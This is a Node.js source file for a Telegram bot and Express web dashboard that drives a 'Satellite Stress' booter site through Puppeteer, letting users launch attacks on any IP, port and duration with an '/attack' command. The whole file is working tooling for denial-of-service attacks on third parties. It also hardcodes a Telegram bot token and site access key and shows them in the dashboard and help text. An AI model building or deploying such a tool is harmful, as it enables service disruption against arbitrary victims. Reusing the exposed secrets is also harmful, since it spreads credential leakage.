const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const puppeteer = require('puppeteer');
const fs = require('fs').promises;
const path = require('path');
const app = express();

// Configuration
const TELEGRAM_BOT_TOKEN = '8739857934:AAFC8icETbmsxjYIqxcOmF8MHD_xg7xHZdo';
const ACCESS_KEY = '2d1139b0c49e3019b0a54a5f6e60062957db4353b4daf6259b8a2752276d26b4';
const LOGIN_URL = 'https://satellitestress.st/login';
const ATTACK_URL = 'https://satellitestress.st/attack';
const SESSION_FILE = path.join(__dirname, 'session.json');
const PORT = process.env.PORT || 3000;

// Global variables
let browser = null;
let page = null;
let isLoggedIn = false;
let loginTime = null;
let browserInitialized = false;

// Initialize Telegram Bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static('public'));

// Check if session file exists
async function sessionExists() {
    try {
        await fs.access(SESSION_FILE);
        return true;
    } catch {
        return false;
    }
}

// Initialize browser
async function initBrowser() {
    if (!browserInitialized) {
        console.log('🚀 Launching browser...');
        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920,1080'
            ]
        });
        page = await browser.newPage();
        await page.setViewport({ width: 1920, height: 1080 });
        browserInitialized = true;
        console.log('✅ Browser launched successfully');
    }
    return page;
}

// Load saved session on startup
async function loadSavedSession() {
    try {
        await initBrowser();
        
        if (await sessionExists()) {
            console.log('📂 Loading saved session from file...');
            const savedCookies = JSON.parse(await fs.readFile(SESSION_FILE, 'utf8'));
            
            if (savedCookies.length > 0) {
                await page.setCookie(...savedCookies);
                
                // Verify session
                await page.goto(ATTACK_URL, { waitUntil: 'networkidle2', timeout: 30000 });
                
                if (page.url().includes('attack')) {
                    isLoggedIn = true;
                    loginTime = 'Session loaded from file';
                    console.log('✅ Saved session loaded successfully!');
                    console.log('📍 Current URL:', page.url());
                } else {
                    console.log('⚠️ Saved session expired, manual login required');
                    isLoggedIn = false;
                }
            } else {
                console.log('⚠️ Session file is empty');
                isLoggedIn = false;
            }
        } else {
            console.log('📂 No saved session found. Manual login required.');
            isLoggedIn = false;
        }
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        isLoggedIn = false;
    }
}

// HTML Dashboard
app.get('/', async (req, res) => {
    const sessionExistsFlag = await sessionExists();
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Satellite Stress Bot - Manual Login</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #0b1120 0%, #1a2639 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 20px;
                }
                .container {
                    max-width: 1100px;
                    width: 100%;
                    background: white;
                    border-radius: 24px;
                    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
                    overflow: hidden;
                }
                .header {
                    background: linear-gradient(135deg, #2563eb 0%, #7c3aed 100%);
                    color: white;
                    padding: 30px;
                    text-align: center;
                }
                .header h1 { font-size: 36px; margin-bottom: 10px; }
                .header p { opacity: 0.9; font-size: 16px; }
                .content { padding: 30px; }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: #f8fafc;
                    border-radius: 16px;
                    padding: 20px;
                    border: 1px solid #e2e8f0;
                }
                .stat-title {
                    color: #64748b;
                    font-size: 14px;
                    text-transform: uppercase;
                    letter-spacing: 0.05em;
                    margin-bottom: 10px;
                }
                .stat-value {
                    font-size: 24px;
                    font-weight: 700;
                    color: #0f172a;
                }
                .stat-badge {
                    display: inline-block;
                    padding: 4px 12px;
                    border-radius: 9999px;
                    font-size: 12px;
                    font-weight: 600;
                    margin-left: 10px;
                }
                .badge-success { background: #22c55e; color: white; }
                .badge-warning { background: #eab308; color: white; }
                .badge-error { background: #ef4444; color: white; }
                .login-panel {
                    background: #f1f5f9;
                    border-radius: 16px;
                    padding: 25px;
                    margin-bottom: 30px;
                    border: 2px solid #2563eb;
                }
                .login-panel h3 {
                    color: #0f172a;
                    margin-bottom: 20px;
                    font-size: 20px;
                }
                .access-key-box {
                    background: #0f172a;
                    color: #e2e8f0;
                    padding: 20px;
                    border-radius: 12px;
                    font-family: monospace;
                    font-size: 14px;
                    word-break: break-all;
                    margin: 20px 0;
                    border-left: 4px solid #2563eb;
                }
                .button-group {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin: 20px 0;
                }
                .btn {
                    padding: 15px 25px;
                    border: none;
                    border-radius: 12px;
                    font-weight: 600;
                    font-size: 16px;
                    cursor: pointer;
                    transition: all 0.3s;
                    color: white;
                }
                .btn-primary { background: #2563eb; }
                .btn-primary:hover { background: #1d4ed8; transform: translateY(-2px); }
                .btn-success { background: #22c55e; }
                .btn-success:hover { background: #16a34a; transform: translateY(-2px); }
                .btn-warning { background: #eab308; }
                .btn-warning:hover { background: #ca8a04; transform: translateY(-2px); }
                .iframe-container {
                    background: white;
                    border-radius: 16px;
                    overflow: hidden;
                    border: 1px solid #e2e8f0;
                    margin: 20px 0;
                    height: 500px;
                    display: none;
                }
                iframe {
                    width: 100%;
                    height: 100%;
                    border: none;
                }
                .telegram-link {
                    display: block;
                    background: #1e293b;
                    color: white;
                    text-align: center;
                    padding: 15px;
                    border-radius: 12px;
                    text-decoration: none;
                    font-weight: 600;
                    margin-top: 20px;
                    border: 1px solid #334155;
                }
                .telegram-link:hover { background: #0f172a; }
                .footer {
                    text-align: center;
                    padding: 20px;
                    background: #f8fafc;
                    border-top: 1px solid #e2e8f0;
                    color: #64748b;
                }
                .url-box {
                    background: #e2e8f0;
                    padding: 15px;
                    border-radius: 8px;
                    font-family: monospace;
                    margin: 10px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🚀 Satellite Stress Bot</h1>
                    <p>Manual Login System | Session Persistence on Render</p>
                </div>
                
                <div class="content">
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-title">Login Status</div>
                            <div class="stat-value">
                                <span id="loginStatusText">${isLoggedIn ? 'Logged In' : 'Not Logged In'}</span>
                                <span id="loginBadge" class="stat-badge ${isLoggedIn ? 'badge-success' : 'badge-warning'}">
                                    ${isLoggedIn ? 'ACTIVE' : 'INACTIVE'}
                                </span>
                            </div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-title">Session File</div>
                            <div class="stat-value">
                                <span id="sessionStatus">${sessionExistsFlag ? '✅ Saved' : '❌ Not Saved'}</span>
                            </div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-title">Bot Status</div>
                            <div class="stat-value">
                                <span class="stat-badge badge-success">RUNNING</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="login-panel">
                        <h3>🔐 Manual Login Required (Do Once)</h3>
                        
                        <div class="access-key-box">
                            <strong>🔑 Access Key:</strong><br>
                            ${ACCESS_KEY}
                        </div>
                        
                        <div class="url-box">
                            <strong>🌐 Website:</strong> ${LOGIN_URL}
                        </div>
                        
                        <div class="button-group">
                            <button class="btn btn-primary" onclick="openLoginPage()">
                                🌐 Open Login Page
                            </button>
                            <button class="btn btn-success" onclick="saveSession()">
                                💾 Save Session After Login
                            </button>
                            <button class="btn btn-warning" onclick="checkStatus()">
                                🔄 Check Status
                            </button>
                        </div>
                        
                        <div class="iframe-container" id="loginFrame">
                            <iframe id="loginIframe" src="about:blank"></iframe>
                        </div>
                    </div>
                    
                    <div style="background: #e6f7ff; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #1890ff;">
                        <strong>📝 Instructions:</strong><br>
                        1. Click "Open Login Page" button above<br>
                        2. Enter the Access Key shown above<br>
                        3. Complete any captcha if present<br>
                        4. After successful login, click "Save Session After Login"<br>
                        5. Session will be saved permanently on Render
                    </div>
                    
                    <a href="https://t.me/satellitestress_bot" class="telegram-link" target="_blank">
                        📱 Open Telegram Bot & Send /attack commands
                    </a>
                    
                    <div style="margin-top: 20px; text-align: center;">
                        <small>Example: /attack 104.29.138.132 80 120</small>
                    </div>
                </div>
                
                <div class="footer">
                    ⚡ Session Auto-Saved on Render | Login Once, Use Forever<br>
                    Render URL: ${req.headers.host}
                </div>
            </div>
            
            <script>
                async function openLoginPage() {
                    document.getElementById('loginFrame').style.display = 'block';
                    document.getElementById('loginIframe').src = '${LOGIN_URL}';
                }
                
                async function saveSession() {
                    const btn = event.target;
                    btn.textContent = '💾 Saving...';
                    btn.disabled = true;
                    
                    try {
                        const response = await fetch('/api/save-session', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' }
                        });
                        const data = await response.json();
                        
                        if (data.success) {
                            alert('✅ Session saved successfully! You can now use /attack commands in Telegram.');
                            checkStatus();
                        } else {
                            alert('❌ Failed to save session: ' + data.message);
                        }
                    } catch (error) {
                        alert('❌ Error: ' + error.message);
                    } finally {
                        btn.textContent = '💾 Save Session After Login';
                        btn.disabled = false;
                    }
                }
                
                async function checkStatus() {
                    const response = await fetch('/api/status');
                    const data = await response.json();
                    
                    const statusText = document.getElementById('loginStatusText');
                    const statusBadge = document.getElementById('loginBadge');
                    const sessionStatus = document.getElementById('sessionStatus');
                    
                    statusText.textContent = data.isLoggedIn ? 'Logged In' : 'Not Logged In';
                    statusBadge.textContent = data.isLoggedIn ? 'ACTIVE' : 'INACTIVE';
                    statusBadge.className = 'stat-badge ' + (data.isLoggedIn ? 'badge-success' : 'badge-warning');
                    sessionStatus.textContent = data.sessionExists ? '✅ Saved' : '❌ Not Saved';
                    
                    if (data.isLoggedIn) {
                        alert('✅ Status: Logged in and ready!');
                    } else {
                        alert('❌ Status: Not logged in. Please login first.');
                    }
                }
                
                // Auto check status every 10 seconds
                setInterval(checkStatus, 10000);
            </script>
        </body>
        </html>
    `);
});

// API to save session
app.post('/api/save-session', async (req, res) => {
    try {
        await initBrowser();
        
        // Get current cookies
        const cookies = await page.cookies();
        
        if (cookies.length > 0) {
            // Save cookies to file
            await fs.writeFile(SESSION_FILE, JSON.stringify(cookies, null, 2));
            
            // Update login status
            isLoggedIn = true;
            loginTime = new Date().toLocaleString();
            
            console.log('✅ Session saved manually at:', loginTime);
            console.log(`📊 Cookies saved: ${cookies.length} cookies`);
            
            res.json({ 
                success: true, 
                message: 'Session saved successfully',
                cookieCount: cookies.length
            });
        } else {
            res.json({ 
                success: false, 
                message: 'No cookies found. Please login to the website first.' 
            });
        }
    } catch (error) {
        console.error('❌ Error saving session:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// API to check status
app.get('/api/status', async (req, res) => {
    const sessionExistsFlag = await sessionExists();
    res.json({
        isLoggedIn: isLoggedIn,
        sessionExists: sessionExistsFlag,
        loginTime: loginTime,
        browserReady: browserInitialized
    });
});

// API to get session info
app.get('/api/session-info', async (req, res) => {
    try {
        if (await sessionExists()) {
            const stats = await fs.stat(SESSION_FILE);
            res.json({
                exists: true,
                size: stats.size,
                modified: stats.mtime
            });
        } else {
            res.json({ exists: false });
        }
    } catch (error) {
        res.json({ exists: false, error: error.message });
    }
});

// Telegram Bot Commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        `🚀 *Satellite Stress Bot*\n\n` +
        `✅ Bot is running on Render\n` +
        `🔐 Manual login required via web interface\n\n` +
        `*Commands:*\n` +
        `• /status - Check login status\n` +
        `• /attack <IP> <PORT> <TIME> - Launch attack\n` +
        `• /help - Show help\n\n` +
        `🌐 Web Interface: ${process.env.RENDER_EXTERNAL_URL || 'Check Render URL'}`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        `📚 *How to Use:*\n\n` +
        `1️⃣ Open web interface (Render URL)\n` +
        `2️⃣ Click "Open Login Page" and login manually\n` +
        `3️⃣ Enter Access Key: \`${ACCESS_KEY}\`\n` +
        `4️⃣ After login, click "Save Session After Login"\n` +
        `5️⃣ Use /attack commands here\n\n` +
        `*Attack Format:*\n` +
        `\`/attack 104.29.138.132 80 120\`\n\n` +
        `*Check Status:*\n` +
        `\`/status\` - Check if logged in`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/status/, async (msg) => {
    const chatId = msg.chat.id;
    const sessionExistsFlag = await sessionExists();
    
    let statusMessage = `📊 *Login Status:*\n\n`;
    statusMessage += `• Website Login: ${isLoggedIn ? '✅ LOGGED IN' : '❌ NOT LOGGED IN'}\n`;
    statusMessage += `• Session Saved: ${sessionExistsFlag ? '✅ YES' : '❌ NO'}\n`;
    statusMessage += `• Login Time: ${loginTime || 'Never'}\n\n`;
    
    if (!isLoggedIn) {
        statusMessage += `🔐 Please login manually via web interface:\n`;
        statusMessage += `🌐 ${process.env.RENDER_EXTERNAL_URL || 'Check Render URL'}`;
    } else {
        statusMessage += `✅ Ready to launch attacks! Use /attack command.`;
    }
    
    bot.sendMessage(chatId, statusMessage, { parse_mode: 'Markdown' });
});

bot.onText(/\/attack (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    
    // Check if logged in
    if (!isLoggedIn || !page) {
        bot.sendMessage(chatId, 
            '❌ *Not Logged In*\n\n' +
            'Please login first via web interface:\n' +
            `🌐 ${process.env.RENDER_EXTERNAL_URL || 'Check Render URL'}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const args = match[1].split(' ');
    if (args.length < 3) {
        bot.sendMessage(chatId, 
            '❌ *Invalid Format*\n\n' +
            'Usage: /attack <IP> <PORT> <TIME>\n' +
            'Example: /attack 104.29.138.132 80 120',
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const [ip, port, time] = args;
    
    // Validate inputs
    if (isNaN(port) || isNaN(time) || port < 1 || port > 65535 || time < 1) {
        bot.sendMessage(chatId, 
            '❌ *Invalid Parameters*\n\n' +
            'Port must be between 1-65535\n' +
            'Time must be positive number',
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    bot.sendMessage(chatId, 
        `🚀 *Launching Attack...*\n\n` +
        `Target: \`${ip}\`\n` +
        `Port: \`${port}\`\n` +
        `Duration: \`${time}s\``,
        { parse_mode: 'Markdown' }
    );
    
    try {
        // Go to attack page
        await page.goto(ATTACK_URL, { waitUntil: 'networkidle2', timeout: 15000 });
        
        // Fill attack form
        await page.waitForSelector('input[name="ip"]', { timeout: 5000 });
        await page.type('input[name="ip"]', ip, { delay: 50 });
        await page.type('input[name="port"]', port.toString(), { delay: 50 });
        await page.type('input[name="time"]', time.toString(), { delay: 50 });
        
        // Click launch button
        await page.click('button[type="submit"]');
        
        // Wait for response
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        bot.sendMessage(chatId, 
            `✅ *Attack Launched Successfully!*\n\n` +
            `Target: \`${ip}:${port}\`\n` +
            `Duration: \`${time} seconds\``,
            { parse_mode: 'Markdown' }
        );
        
    } catch (error) {
        console.error('❌ Attack error:', error);
        bot.sendMessage(chatId, 
            '❌ *Attack Failed*\n\n' +
            'Error: ' + error.message,
            { parse_mode: 'Markdown' }
        );
    }
});

// Initialize on startup
(async () => {
    console.log('='.repeat(50));
    console.log('🤖 Starting Satellite Stress Bot...');
    console.log('='.repeat(50));
    
    await loadSavedSession();
    
    console.log('='.repeat(50));
    console.log('✅ Bot is ready!');
    console.log('📱 Telegram Bot: @satellitestress_bot');
    console.log('🌐 Web interface will be available on port', PORT);
    console.log('='.repeat(50));
})();

// Graceful shutdown
process.on('SIGTERM', async () => {
    console.log('📴 Shutting down gracefully...');
    if (browser) await browser.close();
    process.exit(0);
});

process.on('SIGINT', async () => {
    console.log('📴 Shutting down gracefully...');
    if (browser) await browser.close();
    process.exit(0);
});

// Start server
app.listen(PORT, () => {
    console.log(`🌐 Server running on http://localhost:${PORT}`);
});
